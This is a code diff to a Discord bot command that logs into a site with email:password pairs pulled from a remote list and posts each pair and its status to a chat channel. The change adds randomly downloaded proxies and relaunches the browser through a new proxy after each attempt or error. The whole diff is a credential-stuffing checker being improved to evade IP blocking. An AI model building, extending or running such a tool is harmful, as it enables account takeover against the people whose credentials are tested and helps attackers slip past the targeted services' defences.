@@ -6,21 +6,26 @@ const {
   getRootDir,
   getUserAgent,
   getRandomInt,
-  ProgressText
+  downloadAndGetRandomProxy
 } = require("../../utils");
 const { prefix } = require("../../config");
 
 const document = {};
 
-const puppeteerOptions = {
-  args: [
-    "--disable-gpu",
-    "--disable-dev-shm-usage",
-    "--disable-setuid-sandbox",
-    "--no-first-run",
-    "--no-sandbox",
-    "--no-zygote"
-  ]
+const getPuppeteerOptions = async url => {
+  const proxy = await downloadAndGetRandomProxy(url);
+
+  return {
+    args: [
+      "--disable-gpu",
+      "--disable-dev-shm-usage",
+      "--disable-setuid-sandbox",
+      "--no-first-run",
+      "--no-sandbox",
+      "--no-zygote",
+      `--proxy-server=${proxy}`
+    ]
+  };
 };
 
 const getCredentials = url => fetch(url).then(res => res.text());
@@ -81,6 +86,7 @@ const checkCredentials = async (
         message.channel.send(`${cred_status} -> ${email}:${password}`);
 
         await browser.close();
+        const puppeteerOptions = await getPuppeteerOptions(URL);
         const newBrowser = await puppeteer.launch(puppeteerOptions);
         checkCredentials(
           { browser: newBrowser, credentials, message, msg },
@@ -103,6 +109,7 @@ const checkCredentials = async (
     // eslint-disable-next-line require-atomic-updates
     error_message = err;
     await browser.close();
+    const puppeteerOptions = await getPuppeteerOptions(URL);
     const newBrowser = await puppeteer.launch(puppeteerOptions);
     checkCredentials(
       { browser: newBrowser, credentials, message, msg },
@@ -130,6 +137,7 @@ module.exports = {
       )
       .filter(val => !!val);
 
+    const puppeteerOptions = await getPuppeteerOptions(URL);
     const browser = await puppeteer.launch(puppeteerOptions);
 
     return message.channel.send("Please wait...").then(async msg => {
